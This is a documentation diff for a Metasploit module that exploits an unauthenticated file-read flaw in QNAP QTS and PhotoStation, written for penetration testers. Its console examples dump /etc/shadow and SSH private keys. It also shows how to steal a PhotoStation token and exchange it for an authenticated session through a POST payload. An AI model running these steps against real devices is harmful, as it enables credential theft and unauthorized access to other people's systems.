@@ -1,23 +1,48 @@
-## Introduction
+## Vulnerable Application
+
+### Introduction
 
 This module abuses a vulnerability in QNAP QTS and PhotoStation that allows an
 unauthenticated user to download files off the file system, and because the server
 runs as root, it's possible to include sensitive files, including ssh private keys and
 password hashes.
 
+`/etc/shadow` entries can be processed offline, the module saves them in the creds,
+and they can be cracked using john the ripper, or hashcat.
+
+There is some confusion in the CVEs assigned to this vulnerability, it corresponds to
+one of these : CVE-2019-7192, CVE-2019-7194 or CVE-2019-7195, notice that two of them
+have the same description.
+
+
+## Verification Steps
+
+1. Start `msfconsole`
+2. Do: `use auxiliary/gather/qnap_lfi`
+3. Do: `set RHOSTS [RHOSTS]`
+4. Do: `check`
+6. Verify if `check` detects vulnerable hosts as it should
+7. Do: `run`
+8. Do: `loot`
+9. Verify if the run command retrieved the content of /etc/shadow if the host was vulnerable, and saved the file in the loot
+10. Do: `creds`
+11. Verify if the retrieved hashes were saved in the creds, and their hash type identified correctly.
+
 ## Options
 
-**FILEPATH**
+### FILEPATH
 
 Set this to the file you want to dump. The default is `/etc/shadow`.
 
-**PRINT**
+### PRINT
 
 Whether to print file contents to the screen, defaults to true.
 
-## Usage
+## Scenarios
 
-Dumping hashes from /etc/shadow
+### QNAP QTS 4.3.3
+
+#### Dumping hashes from `/etc/shadow`
 
 ```
 msf5 auxiliary(gather/qnap_lfi) > run
@@ -52,7 +77,7 @@ msf5 auxiliary(gather/qnap_lfi) >
 
 ```
 
-Dumping ssh private keys:
+#### Dumping ssh private keys
 
 ```
 msf5 auxiliary(gather/qnap_lfi) > set FILEPATH /root/.ssh/id_rsa
@@ -98,7 +123,7 @@ ECvSmTESX+vkqMq5sbzBxAf6TAw+i14eH4CgEsGnc0ui7ri5CU6y
 msf5 auxiliary(gather/qnap_lfi) > 
 ```
 
-Retrieving the token, can be used to authenticate.
+#### Retrieving the token, can be used to authenticate
 
 ```
 msf5 auxiliary(gather/qnap_lfi) > set FILEPATH /share/Multimedia/.@__thumb/ps.app.token
@@ -117,3 +142,9 @@ msf5 auxiliary(gather/qnap_lfi) > exploit
 [*] Auxiliary module execution completed
 msf5 auxiliary(gather/qnap_lfi) > 
 ```
+
+The token can then be used to authenticate, by sending a POST request to the uri `/cgi-bin/authLogin.cgi`, for the example above:
+
+sending the POST payload: `app_token=8f9825b4410aaa3bc128865b6a1e75a6&app=PHOTO_STATION&auth=1`
+
+This would return an `authSid`, that can be used with most endpoints that require authentication.
